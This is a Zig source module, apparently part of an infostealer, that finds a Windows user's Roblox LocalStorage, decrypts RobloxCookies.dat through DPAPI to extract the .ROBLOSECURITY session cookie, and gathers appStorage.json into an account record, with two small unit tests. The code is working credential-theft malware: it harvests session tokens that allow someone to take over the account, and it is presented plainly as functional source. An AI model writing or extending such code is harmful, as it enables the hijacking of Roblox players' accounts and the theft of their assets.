const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const file_io = @import("../parsers/file_io.zig");
const dpapi = @import("../crypto/dpapi.zig");

pub const RobloxAccount = struct {
    cookie: []const u8,
    user_id: ?[]const u8,
    username: ?[]const u8,
    display_name: ?[]const u8,
};

pub const GameResult = struct {
    cookie_path: ?[]const u8,
    accounts: []RobloxAccount,
    app_storage_json: ?[]const u8,
};

fn readFileSlice(allocator: std.mem.Allocator, path: []const u8) ?[]const u8 {
    const mmap = file_io.MappedFile.open(path) orelse return null;
    defer mmap.close();
    return allocator.dupe(u8, mmap.slice()) catch null;
}

fn extractDotRoblosecurity(allocator: std.mem.Allocator, path: []const u8) ?[]const u8 {
    const mmap = file_io.MappedFile.open(path) orelse return null;
    defer mmap.close();
    const data = mmap.slice();

    if (data.len < 4) return null;
    if (data.len > 1024 * 64) return null;

    const decrypted = dpapi.decrypt(data) orelse return null;

    var token = std.ArrayList(u8).init(allocator);
    for (decrypted) |b| {
        if (b == 0) break;
        if (std.ascii.isPrint(b) or b == '\n' or b == '\r') {
            token.append(b) catch break;
        }
    }
    if (token.items.len == 0) return null;

    var cleaned = std.ArrayList(u8).init(allocator);
    for (token.items) |b| {
        if (b == '\r') continue;
        if (b == '\n') break;
        cleaned.append(b) catch break;
    }

    return cleaned.toOwnedSlice();
}

fn parseAppStorageJson(allocator: std.mem.Allocator, json_data: []const u8) ?RobloxAccount {
    _ = allocator;
    _ = json_data;
    return null;
}

pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8) !GameResult {
    const cookie_path = try std.fs.path.join(allocator, &[_][]const u8{
        local_app_data, "Roblox", "LocalStorage", "RobloxCookies.dat",
    });
    defer allocator.free(cookie_path);

    var dir = std.fs.openDirAbsolute(try std.fs.path.join(allocator, &[_][]const u8{
        local_app_data, "Roblox", "LocalStorage",
    }), .{}) catch {
        return GameResult{
            .cookie_path = null,
            .accounts = &[_]RobloxAccount{},
            .app_storage_json = null,
        };
    };
    dir.close();

    const cookie = extractDotRoblosecurity(allocator, cookie_path);

    const app_storage_path = try std.fs.path.join(allocator, &[_][]const u8{
        local_app_data, "Roblox", "LocalStorage", "appStorage.json",
    });
    defer allocator.free(app_storage_path);

    const app_storage_json = readFileSlice(allocator, app_storage_path);

    var accounts = std.ArrayList(RobloxAccount).init(allocator);
    if (cookie) |c| {
        try accounts.append(RobloxAccount{
            .cookie = c,
            .user_id = null,
            .username = null,
            .display_name = null,
        });
    }

    return GameResult{
        .cookie_path = try allocator.dupe(u8, cookie_path),
        .accounts = try accounts.toOwnedSlice(),
        .app_storage_json = app_storage_json,
    };
}

fn freeGameResult(result: GameResult, allocator: std.mem.Allocator) void {
    if (result.cookie_path) |p| allocator.free(p);
    for (result.accounts) |a| {
        allocator.free(a.cookie);
        if (a.user_id) |u| allocator.free(u);
        if (a.username) |u| allocator.free(u);
        if (a.display_name) |d| allocator.free(d);
    }
    allocator.free(result.accounts);
    if (result.app_storage_json) |j| allocator.free(j);
}

const testing = std.testing;

test "collect returns empty for nonexistent roblox" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__local");
    defer freeGameResult(result, testing.allocator);
    try testing.expect(result.cookie_path == null);
    try testing.expectEqual(@as(usize, 0), result.accounts.len);
    try testing.expect(result.app_storage_json == null);
}

test "extractDotRoblosecurity returns null for invalid data" {
    const result = extractDotRoblosecurity(testing.allocator, "C:\\__nonexistent__file");
    try testing.expect(result == null);
}
